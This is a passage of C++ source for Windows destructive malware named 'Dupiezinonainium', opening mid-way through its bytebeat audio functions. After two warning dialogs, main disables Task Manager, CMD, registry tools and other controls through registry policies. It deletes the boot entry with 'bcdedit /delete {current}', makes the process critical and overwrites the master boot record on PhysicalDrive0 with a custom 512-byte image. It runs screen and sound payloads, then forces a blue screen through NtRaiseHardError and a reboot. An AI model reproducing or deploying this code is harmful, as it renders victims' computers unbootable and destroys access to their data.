		BYTE bFreq = (BYTE)(128 * cos((91 * (t >> (78 + (t >> 91 | t >> 13 | (t >> (t >> 13 ^ t >> 91) + 7)) & 7))) / 40.75) + 128);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat12() {
	int nSamplesPerSec = 8192, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((11 * (t >> 4 & t) + (t >> 5) + (t >> 14)) * 129 | t >> 9));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat13() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((91 * tan(sqrt((t >> 5 & t) + (t >> 4) + t * (t >> 18)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat14() {
	int nSamplesPerSec = 44099, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(66 * cos(16 * cbrt(t % 16384)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}


const unsigned char MasterBootRecord[512] = { 
	0xEA, 0x2E, 0x7C, 0x00, 0x00, 0x31, 0xC9, 0x31, 0xD2, 0xFF, 0x06, 0x7B, 0x7C, 0x89, 0x0E, 0x7D, 
	0x7C, 0x89, 0x16, 0x7F, 0x7C, 0xEB, 0x31, 0x81, 0xF9, 0x40, 0x01, 0x73, 0x0C, 0x81, 0xFA, 0xC8, 
	0x00, 0x73, 0xE2, 0xCD, 0x10, 0x41, 0xEB, 0xE5, 0xC3, 0x31, 0xC9, 0x42, 0xEB, 0xDF, 0xB8, 0x13, 
	0x00, 0x31, 0xDB, 0x31, 0xC9, 0x31, 0xD2, 0xCD, 0x10, 0x68, 0x00, 0xA0, 0x07, 0xB8, 0x00, 0x0C, 
	0x31, 0xDB, 0x31, 0xC9, 0x31, 0xD2, 0xEB, 0xC5, 0x89, 0xCB, 0x31, 0xD3, 0x02, 0x1E, 0x7B, 0x7C, 
	0x88, 0xD8, 0xC0, 0xE8, 0x02, 0xEB, 0x00, 0x3C, 0x37, 0x77, 0x06, 0x3C, 0x20, 0x72, 0x06, 0xEB, 
	0xB6, 0x2C, 0x10, 0xEB, 0xF2, 0x04, 0x20, 0xEB, 0xEE, 0x3C, 0x1F, 0x77, 0x06, 0x3C, 0x10, 0x72, 
	0x06, 0xEB, 0xA4, 0x2C, 0x10, 0xEB, 0xF2, 0x04, 0x20, 0xEB, 0xEE, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);
BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}
BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
DWORD WINAPI KillMBR(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	return 1;
}
void reg_addition(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value)//credits to Mist0090 because creating registry keys in C++ without shitty system() or reg.exe is hell
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition
	);
	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);
	RegCloseKey(hKey);
	return;
}
DWORD WINAPI WindowShake(LPVOID lpParam) {
	int R = 10, PO = 0;
	srand((unsigned)time(NULL));
	while (true) 
	{
		RECT rt;
		HWND up = GetForegroundWindow();
		GetWindowRect(up, &rt);
		PO = rand() % 4 + 1;
		if (PO == 4) { SetWindowPos(up, 0, rt.left + R, rt.top, 100, 100, SWP_NOSIZE); }
		if (PO == 3) { SetWindowPos(up, 0, rt.left - R, rt.top, 100, 100, SWP_NOSIZE); }
		if (PO == 2) { SetWindowPos(up, 0, rt.left, rt.top + R, 100, 100, SWP_NOSIZE); }
		if (PO == 1) { SetWindowPos(up, 0, rt.left, rt.top - R, 100, 100, SWP_NOSIZE); }
		Sleep(1);
	}
}
DWORD WINAPI RandText(LPVOID lpParam) {
	while (true) {
		EnumChildWindows(GetDesktopWindow(), EnumProc, 0);
		Sleep(100);
	}
}
DWORD WINAPI HideTaskbar(LPVOID lpParam) {
	HWND taskbar = FindWindow(L"Shell_TrayWnd", NULL);
	ShowWindow(taskbar, SW_HIDE);
	return 0;
}
int main()
{
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CREATE_NO_WINDOW;
	if (MessageBoxA(NULL, "Warning! This program is a malware that known as 'Dupiezinonainium'. It may make your computer cannot work normally. Whether to run or not?\r\n\Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the \"No\" button to cancel the running. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the \"Yes\" button to continue.", "Dupiezinonainium.exe--First warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		CREATE_NO_WINDOW;
		if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\Do you want to run this? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! LambdaTechnology(@LambdaTech-w3o) is NOT responsible for any damages caused by this malware!!!", L"Dupiezinonainium.exe--LAST WARNING", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			system("taskkill /f /im taskmgr.exe");
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer", L"NoRun", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer", L"NoControlPanel", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableLockWorkstation", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", L"NoLogoff", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableChangePassword", REG_DWORD, 1);
			reg_addition(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"HideFastUserSwiching", REG_DWORD, 1);
			system("bcdedit /delete {current}");
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 1);
			CreateThread(0, 0, KillMBR, 0, 0, 0);
			CreateThread(0, 0, HideTaskbar, 0, 0, 0);
			HANDLE thread0_num1 = CreateThread(0, 0, RandText, 0, 0, 0);
			HANDLE thread0_num2 = CreateThread(0, 0, WindowShake, 0, 0, 0);
			Sleep(5000);
			HANDLE thread1_num1 = CreateThread(0, 0, Payload1_num1, 0, 0, 0);
			HANDLE thread1_num2 = CreateThread(0, 0, Payload1_num2, 0, 0, 0);
			bytebeat1();
			TerminateThread(thread1_num1, 0);
			CloseHandle(thread1_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread2 = CreateThread(0, 0, Payload2_num1, 0, 0, 0);
			bytebeat2();
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread3 = CreateThread(0, 0, Payload3_num1, 0, 0, 0);
			bytebeat3();
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread4_num1 = CreateThread(0, 0, Payload4_num1, 0, 0, 0);
			HANDLE thread4_num2 = CreateThread(0, 0, Payload4_num2, 0, 0, 0);
			HANDLE thread4_num3 = CreateThread(0, 0, Payload4_num3, 0, 0, 0);
			bytebeat4();
			TerminateThread(thread4_num1, 0);
			CloseHandle(thread4_num1);
			TerminateThread(thread4_num2, 0);
			CloseHandle(thread4_num2);
			TerminateThread(thread4_num3, 0);
			CloseHandle(thread4_num3);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread5 = CreateThread(0, 0, Payload5_num1, 0, 0, 0);
			bytebeat5();
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread6_num1 = CreateThread(0, 0, Payload6_num1, 0, 0, 0);
			HANDLE thread6_num2 = CreateThread(0, 0, Payload6_num2, 0, 0, 0);
			HANDLE thread6_num3 = CreateThread(0, 0, Payload6_num3, 0, 0, 0);
			bytebeat6();
			TerminateThread(thread6_num1, 0);
			CloseHandle(thread6_num1);
			TerminateThread(thread6_num2, 0);
			CloseHandle(thread6_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread7_num1 = CreateThread(0, 0, Payload7_num1, 0, 0, 0);
			HANDLE thread7_num2 = CreateThread(0, 0, Payload7_num2, 0, 0, 0);
			bytebeat7();
			TerminateThread(thread7_num1, 0);
			CloseHandle(thread7_num1);
			TerminateThread(thread7_num2, 0);
			CloseHandle(thread7_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread8_num1 = CreateThread(0, 0, Payload8_num1, 0, 0, 0);
			HANDLE thread8_num2 = CreateThread(0, 0, Payload8_num2, 0, 0, 0);
			bytebeat8();
			TerminateThread(thread8_num1, 0);
			CloseHandle(thread8_num1);
			TerminateThread(thread8_num2, 0);
			CloseHandle(thread8_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread9_num1 = CreateThread(0, 0, Payload9_num1, 0, 0, 0);
			HANDLE thread9_num2 = CreateThread(0, 0, Payload9_num2, 0, 0, 0);
			bytebeat9();
			TerminateThread(thread9_num1, 0);
			CloseHandle(thread9_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread10_num1 = CreateThread(0, 0, Payload10_num1, 0, 0, 0);
			HANDLE thread10_num2 = CreateThread(0, 0, Payload10_num2, 0, 0, 0);
			bytebeat10();
			TerminateThread(thread10_num1, 0);
			CloseHandle(thread10_num1);
			TerminateThread(thread10_num2, 0);
			CloseHandle(thread10_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread11 = CreateThread(0, 0, Payload11_num1, 0, 0, 0);
			bytebeat11();
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread12 = CreateThread(0, 0, Payload12_num1, 0, 0, 0);
			bytebeat12();
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread13 = CreateThread(0, 0, Payload13_num1, 0, 0, 0);
			bytebeat13();
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread14 = CreateThread(0, 0, Payload14_num1, 0, 0, 0);
			bytebeat14();
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			InvalidateRect(0, 0, 0);
			refreshscr();
			TerminateThread(thread0_num1, 0);
			CloseHandle(thread0_num1);
			TerminateThread(thread0_num2, 0);
			CloseHandle(thread0_num2);
			TerminateThread(thread1_num2, 0);
			CloseHandle(thread1_num2);
			TerminateThread(thread6_num3, 0);
			CloseHandle(thread6_num3);
			TerminateThread(thread9_num2, 0);
			CloseHandle(thread9_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0x91789178, 0, 0, 0, 6, &response);
			// If the computer is still running, do it the normal way
			HANDLE token;
			TOKEN_PRIVILEGES privileges;
			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
			// The actual restart
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			Sleep(-1);
		}
	}
	return 0;
}
